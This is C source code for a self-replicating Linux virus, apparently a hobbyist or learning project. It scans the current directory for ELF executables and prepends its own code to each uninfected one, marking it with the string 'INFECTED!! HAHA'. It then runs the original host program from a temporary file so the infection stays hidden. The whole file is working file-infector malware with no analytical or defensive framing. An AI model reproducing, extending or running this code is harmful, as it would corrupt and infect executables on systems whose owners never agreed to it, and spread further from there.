#include<stdio.h>
#include<stdlib.h>
#include<dirent.h>
#include<string.h>
#include<sys/types.h>
#include<sys/stat.h>
#include<sys/wait.h>
#include<fcntl.h>
#include<error.h>

#define	hardsize 	13879	
#define	blocksize	hardsize
#define SIG_LEN		15
#define MAX_TMP		50

char targets[10][10];
DIR *dirh;
struct dirent *dirent_p;
char mydir = '.';
char *buf;
char *virus_buf;

main(int argc,char *argv[]){
	int i,fd,n,max_index;
	int virus_fd,target_fd;
	int temp_fd;
	int readcount;
	pid_t pid;
	int waitstatus;
	char *temp_1 = malloc(MAX_TMP);
	char temp_2[MAX_TMP];

	virus_buf = malloc(blocksize);
	buf = malloc(blocksize);
	if((dirh = opendir(&mydir)) == NULL){
		perror(opendir);
		exit(0);
	}

	for(dirent_p = readdir(dirh),i = 0 ; dirent_p != NULL ; dirent_p = readdir(dirh)){
		//skip . and .. and the virus prototype
		if(strcmp(dirent_p->d_name,".") == 0) continue;
		if(strcmp(dirent_p->d_name,"..") == 0) continue;
		if(strcmp(dirent_p->d_name,"virus") == 0) continue;
		if((fd = open(dirent_p->d_name,0)) == -1){
			printf("error opening target file while scanning for targets");
			continue;
		}
		n = read(fd,buf,4);
		if(strncmp("\x7f\x45\x4c\x46",buf,4) == 0){
printf("%s %d\n",dirent_p->d_name,i);
			n = lseek(fd,(off_t)-15,SEEK_END);
			n = read(fd,temp_2,SIG_LEN);
			temp_2[n] = '\0';
			if(strncmp(temp_2,"INFECTED!! HAHA",15) != 0)
				strcpy(targets[i++],dirent_p->d_name);
		}
		close(fd);
	}
printf("i is %d\n",i);
	if(i < 1)
		goto Exec_phase;
	max_index = i;
	//open the argv[0] once before loop
	if((virus_fd = open(argv[0],O_RDONLY)) == -1){
			printf("error opening opening virus\n");
			perror("open");
			exit(0);
	}
	//read virus into buffer 
	if(read(virus_fd,virus_buf,hardsize) < 0){
		printf("error reading virus\n");
		exit(0);
	}
	for(i=0;i<max_index;i++){
		if((target_fd = open(targets[i],O_RDWR)) == -1){
			printf("error opening target file\n");
			perror("open");
			continue;
		}
		//create a temporary file
		strcpy(temp_1,"tmp");
		strcat(temp_1,targets[i]);
		if((temp_fd = open(temp_1,O_CREAT|O_WRONLY,S_IRWXU)) == -1){
			printf("error opening temp file\n");
			continue;
		}
		//put virus code in temp file
		if(write(temp_fd,virus_buf,hardsize) < 0){
			printf("error writing to temp file\n");
			close(target_fd);
			unlink(temp_1);
			continue;
		}
		//append the target file code to virus code in temp file 
		do{
			if((readcount = read(target_fd,buf,blocksize)) < 0){
				printf("error reading from target file\n");
				close(target_fd);
				unlink(temp_1);
				continue;
			}
			if(write(temp_fd,buf,readcount) < 0){
				printf("error writing to temp\n");
				close(target_fd);
				unlink(temp_1);
				continue;
			}
		}while(readcount == blocksize);
		//mark the infected file and clean up
		write(temp_fd,"INFECTED!! HAHA",15);
		close(target_fd);
		close(temp_fd);
		unlink(targets[i]); 
		//rename temp file 1 to save target file name
		rename(temp_1,targets[i]);
printf("for loop last statement\n");
		//later i can copy old file time stamp to the newly infected file
	}
	close(virus_fd);
/*After all targetst are infected*/
Exec_phase:

	if(strcmp(argv[0],"./virus") == 0) exit(0);
	//create temp file 2
	strcpy(temp_2,"tmp");
	temp_fd = open(temp_2,O_CREAT|O_RDWR,S_IRWXU);
	//copy the code found at the end of this infected file to temp file 2
	virus_fd = open(argv[0],O_RDONLY); //i think it's already opened at this point
	lseek(virus_fd,(off_t)hardsize,SEEK_SET);
	do{
		if((readcount = read(virus_fd,buf,blocksize)) < 0){
			printf("error reading from virus\n");
			exit(0);
		}
		if(write(temp_fd,buf,readcount) < 0){
			printf("error writing to temp file\n");
			exit(0);
		}
	}while(readcount == blocksize);
	close(virus_fd);
	close(temp_fd);
	switch(pid = fork()){
		case -1:
printf("exiting\n");//I think some cleaning needs to be done here
			exit(0);
			break;
		case 0:	
printf("child process passing control to host\n");
			//execute original host program
			char *newargv[] = { "tmp" , NULL };
			char *newenviron = { NULL };
			execve(temp_2,newargv,newenviron);
			perror("execve");
			break;
		default:
printf("pid of child is %d\n",pid);
			//wait for host program to finish
			pid = wait(&waitstatus);
printf("pid %d returned from wait\n",pid);
			//close(virus_fd);
			//delete temp file
			unlink(temp_2);
			free(temp_1);
			free(virus_buf);
			free(buf);
			exit(0);
			break;
		
	}


}
